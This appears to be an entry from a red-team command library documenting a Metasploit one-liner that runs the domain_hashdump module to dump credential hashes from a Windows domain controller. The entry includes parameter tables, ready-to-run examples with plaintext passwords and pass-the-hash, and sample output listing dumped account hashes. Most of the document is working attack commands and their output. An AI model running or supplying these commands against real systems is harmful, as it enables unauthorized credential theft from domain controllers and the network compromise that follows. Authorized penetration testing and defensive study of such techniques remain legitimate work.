---
id: new-uuid-1
name: msfconsole-run-domain-hashdump
type: command
executor: bash
data: >-
  msfconsole -q -x "use windows/gather/credentials/domain_hashdump; set RHOSTS
  $_TARGET_IP; set SMBUser $_USERNAME; set SMBPass $_PASSWORD; run"
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - credential-dumping
  - metasploit
verified: true
validated: true
---

# msfconsole-run-domain-hashdump

## Command

```bash
msfconsole -q -x "use windows/gather/credentials/domain_hashdump; set RHOSTS $_TARGET_IP; set SMBUser $_USERNAME; set SMBPass $_PASSWORD; run"
```

## Description

This command automates the execution of Metasploit's domain_hashdump module to remotely dump domain credential hashes from a Windows domain controller using WMI queries. Use it when you have SMB credentials but no direct shell on the DC.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the domain controller | Yes |
| $_USERNAME | Domain username with admin privileges | Yes |
| $_PASSWORD | Password or NTLM hash for authentication | Yes |
| -q | Quiet mode (suppress banner) | Built-in |
| -x | Execute command string | Built-in |

## Examples

### Basic Usage

```bash
msfconsole -q -x "use windows/gather/credentials/domain_hashdump; set RHOSTS 192.168.1.10; set SMBUser administrator; set SMBPass Password123; run"
```

### Advanced Usage

```bash
msfconsole -q -x "use windows/gather/credentials/domain_hashdump; set RHOSTS 192.168.1.10; set SMBUser admin; set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0; set DisablePayloadHandler true; run"
```

## Expected Output

[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 192.168.1.10:445 - 192.168.1.10:445 - Dumping domain hashes
username:rid:lm:nt
GUEST:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Hashes are stored in loot for further cracking.

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-Hashdump-NinjaCopy-and-CME]]
- [[tools/metasploit-framework]]
